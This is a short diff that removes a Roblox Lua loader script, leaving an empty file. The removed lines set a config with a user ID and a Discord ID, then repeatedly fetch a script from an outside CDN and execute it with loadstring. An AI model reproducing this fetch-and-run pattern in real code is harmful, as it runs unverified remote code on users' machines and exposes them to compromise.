@@ -1,2 +1,1 @@
-task.wait(30)
-_G.Config={UserID="f33e21df-0fbb-4a67-8d67-ff73a4303ef4",discord_id="993062998652493824",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/trackstatblox"))()end)if s then break end wait(5)end
+
